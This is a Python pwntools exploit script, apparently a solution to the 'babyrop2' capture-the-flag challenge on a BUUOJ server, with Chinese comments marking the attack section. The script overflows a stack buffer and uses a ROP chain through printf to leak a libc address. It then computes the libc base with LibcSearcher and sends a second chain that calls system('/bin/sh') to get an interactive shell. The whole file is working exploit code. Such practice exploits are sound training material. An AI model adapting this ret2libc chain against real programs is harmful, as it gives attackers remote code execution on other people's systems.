from pwn import *
from LibcSearcher import LibcSearcher

############################
#********修改文件名**********
############################
file_name = 'babyrop2'
port = 27150
io = -1

###########修改宏###########
DEBUG = 1
LOG_PRINT = 1
TMUX = 0
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

if DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *0x80489a\nc\n')
else: # 远程打
    io = remote('node3.buuoj.cn', port)

io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libc))
context.log_level = 'debug'
log.success('='*100)
##########################下面为攻击代码#######################
##########################下面为攻击代码#######################

main_addr = io_elf.sym['main']
printf_plt_addr = io_elf.plt['printf']
libc_start_main_got = io_elf.got['__libc_start_main']
pop_rdi_ret = 0x400733
pop_rsi_r15 = 0x400731
# 64位下需要一个格式化字符串来泄露，与32位不一样！！
# 64位下的ROP可能还需要维持栈平衡，用ret指令！！！
format_str_addr = 0x400770
ret_addr = 0x4004d1


LOG_ADDR_SUCCESS('main_addr', main_addr)
LOG_ADDR_SUCCESS('printf_plt_addr', printf_plt_addr)
LOG_ADDR_SUCCESS('libc_start_main_got', libc_start_main_got)

#
io.recvuntil("What's your name? ")
# 利用printf泄露基地址
payload = (0x20 + 8) * b'a' 
payload += p64(pop_rdi_ret) + p64(format_str_addr) + p64(pop_rsi_r15) + p64(libc_start_main_got) + p64(0) + p64(printf_plt_addr) +p64(ret_addr) + p64(main_addr)
io.sendline(payload)
message = io.recv()
index = message.index(b'\x7f')
libc_start_main_addr = message[index - 5: index + 1]
libc_start_main_addr = u64(libc_start_main_addr.ljust(8, b'\x00'))
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libc_base_addr = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libc_base_addr + libc.dump('system')
str_bin_sh = libc_base_addr + libc.dump('str_bin_sh')

LOG_ADDR_SUCCESS('libc_start_main_addr', libc_start_main_addr)
LOG_ADDR_SUCCESS('libc_base_addr', libc_base_addr)
LOG_ADDR_SUCCESS('sytem_addr', system_addr)
LOG_ADDR_SUCCESS('str_bin_sh', str_bin_sh)

# io.recv()
payload = (0x20 + 8) * b'a' 
payload += p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system_addr) + p64(ret_addr) + p64(main_addr) 
io.sendline(payload)
# io.recvuntil('bytes of data!\n')

io.interactive()